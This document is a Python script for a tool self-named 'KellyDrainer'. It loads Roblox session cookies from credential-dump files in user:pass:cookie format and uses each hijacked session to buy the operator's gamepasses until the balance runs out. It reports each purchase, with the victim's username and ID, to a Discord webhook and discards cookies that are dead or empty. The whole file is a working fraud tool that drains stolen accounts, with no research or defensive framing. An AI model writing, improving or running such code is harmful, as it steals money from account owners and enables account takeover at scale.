import json, time, os, threading, glob
from src.utils import (
    log, clear_console,
    GREEN, RED, BLUE, PURPLE, YELLOW,
    add_try, add_robux, set_app_name,
    update_cookie_count
)
from src.roblox import RobloxSession, CsrfError
from src.webhook import send_discord_webhook
from src.bot import start_bot

INPUT_DIR = "input"
COOKIES_FILE = os.path.join(INPUT_DIR, "cookies.txt")
CONFIG_FILE = os.path.join(INPUT_DIR, "config.json")

def scrape_input_folder():
    """Extracts cookies from files like robux*.txt and rap*.txt (format user:pass:cookie)"""
    all_cookies = []
    
    file_patterns = [
        os.path.join(INPUT_DIR, "robux*.txt"),
        os.path.join(INPUT_DIR, "rap*.txt")
    ]
    
    files_to_scrape = []
    for pattern in file_patterns:
        files_to_scrape.extend(glob.glob(pattern))
    
    for file in files_to_scrape:
        if "cookies.txt" in os.path.basename(file): continue
        
        try:
            with open(file, "r", encoding="utf-8") as f:
                for line in f:
                    parts = line.strip().split(":")
                    if len(parts) >= 3:
                        cookie = ":".join(parts[2:])
                        all_cookies.append(cookie)
        except Exception as e:
            log("[!]", f"Error reading {file}: {e}", RED)
    
    if all_cookies:
        existing = load_cookies()
        unique_new = [c for c in all_cookies if c not in existing]
        
        if unique_new:
            with open(COOKIES_FILE, "a", encoding="utf-8") as f:
                for c in unique_new:
                    f.write(c + "\n")
            log("[+]", f"Scraped {len(unique_new)} new cookies from input files!", GREEN)

def load_config():
    try:
        with open(CONFIG_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        log("[!]", "config.json not found!", RED)
        exit()

def load_cookies():
    if not os.path.exists(COOKIES_FILE): return []
    with open(COOKIES_FILE, "r", encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]

def save_cookies(cookies):
    with open(COOKIES_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(cookies))

def main():
    if not os.name == "nt": pass # For linux title support if needed
    if not os.path.exists(INPUT_DIR): os.makedirs(INPUT_DIR)
    
    config = load_config()
    gamepasses = sorted(config.get("gamepasses", []), key=lambda x: x['price'], reverse=True)
    
    clear_console()
    set_app_name("KellyDrainer")

    if config.get("bot_token"):
        threading.Thread(target=start_bot, args=(config["bot_token"],), daemon=True).start()

    scrape_input_folder()
    update_cookie_count()

    cookies = load_cookies()
    log("[+]", f"Loaded {len(cookies)} cookies total", BLUE)

    i = 0
    while i < len(cookies):
        cookie = cookies[i]
        try:
            user = RobloxSession(cookie)
            balance = user.get_balance()
            log("[#]", f"{user.username} | Balance: {balance} R$", PURPLE)

            if balance <= 0:
                log("[!]", "Zero balance, removing...", RED)
                cookies.pop(i)
                save_cookies(cookies)
                update_cookie_count()
                continue

            for gp in gamepasses:
                gaid, price = gp["id"], gp["price"]
                if balance >= price:
                    log("[...]", f"Buying: {price} R$", BLUE)
                    
                    status_code, status_json = user.buy_gamepass(gaid)
                    purchased = status_json.get("purchased", False) if isinstance(status_json, dict) else False

                    if purchased:
                        add_try()
                        add_robux(price)
                        balance -= price 
                        log("[✓]", f"Success! Bought {price} R$", GREEN)
                        send_discord_webhook(config["webhook"], user.username, user.user_id, gaid, price, status_code, status_json, "", config["user_id"])
                        time.sleep(1)
                    else:
                        reason = status_json.get("reason", "Unknown")
                        if "Unknown" in reason:
                            log("[!]", "RATELIMITED! Waiting 60s...", YELLOW)
                            time.sleep(60)
                            continue 
                        else:
                            log("[x]", f"Failed: {reason}", RED)
                
        except CsrfError:
            log("[!]", "Invalid cookie, removing...", RED)
            cookies.pop(i)
            save_cookies(cookies)
            update_cookie_count()
            continue
        except Exception as e:
            log("[!]", f"Error: {e}", RED)
            i += 1
            continue
            
        i += 1
        update_cookie_count()
        time.sleep(config.get("delay", 5))

    log("[+]", "Finished!", GREEN)

if __name__ == "__main__":
    main()
